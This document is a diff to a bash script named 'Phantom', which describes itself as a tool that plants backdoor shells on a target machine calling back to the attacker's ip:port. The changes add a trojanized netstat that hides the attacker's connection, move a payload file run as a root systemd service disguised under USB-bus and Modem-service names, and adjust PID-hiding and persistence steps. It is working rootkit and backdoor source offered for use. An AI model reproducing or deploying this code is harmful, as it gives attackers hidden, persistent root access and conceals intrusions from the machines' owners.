@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and hides their pid, persisting through reboots.
-It also hides the files needed to perform the above.
+It also hides the files needed to perform the above and replaces netstat.
 
 Copyright © 2018 Konstantinos Sarantopoulos
 
@@ -50,7 +50,9 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '
 
-ip="127.0.0.1/9999" #change this according to the listening ip and port (you got to also change the _hiding variable according to the instructions there)
+ip="127.0.0.1/9999" #change this according to the listening ip and port 
+#change also the ip and port in the _hiding variable (use search and AAA to find it in the document) 
+#and the ip:port that netstat is gonna hide (use search and QQQ to find it in the document)
 
 user=$(whoami)
 echo "$user"
@@ -459,7 +461,7 @@ while read hide_pid; do
 done <<< "$bash_pid"
 
 #hide bash shells which our systemd service spawns
-inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
+inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
 #resulting hex and use it (without the 0x) in place of 0100007F, then convert the port from decimal to hex and use it in place of 270F)
 #echo "inode_list"
 #echo "$inode_list"
@@ -524,7 +526,7 @@ StartLimitIntervalSec=0
 
 [Service]
 Type=simple
-ExecStart=/sbin/usb-bus
+ExecStart=/etc/usb-bus
 Restart=always
 User=root
 
@@ -1726,7 +1728,7 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
 		break;
 	    }
 
-	if ( strstr(rem_addr, "127.0.0.1:9999") == 0 ) {
+	if ( strstr(rem_addr, "127.0.0.1:9999") == 0 ) { //(QQQ) Change the ip and port 
 		printf("%-4s  %6ld %6ld %-*s %-*s %-11s", prot, rxq, txq, (int)netmax(23,strlen(local_addr)), local_addr, (int)netmax(23,strlen(rem_addr)), rem_addr, _(tcp_state[state]));
 		finish_this_one(uid,inode,timers);
 	} 
@@ -3030,8 +3032,8 @@ if [ "$user" == "root" ]; then
 	#create the files that the systemd services are gonna use
 	printf "$_hiding" >/bin/usb-bus
 	chmod 777 /bin/usb-bus
-	printf "$_bash" >/sbin/usb-bus
-	chmod 777 /sbin/usb-bus
+	printf "$_bash" >/etc/usb-bus
+	chmod 777 /etc/usb-bus
 	
 	#create a systemd service to execute the _hiding script
 	systemctl stop dbus-org.freedesktop.Modem.service 
@@ -3205,7 +3207,7 @@ if [ "$user" == "root" ]; then
 		else
 			echo "failed to download net-tools"
 	fi
-	unzip /tmp/net-tools.zip &>/dev/null
+	unzip -d /tmp /tmp/net-tools.zip >/dev/null
 	if [ "$?" == "0" ]; then
 			echo "unzipped net-tools"
 		else
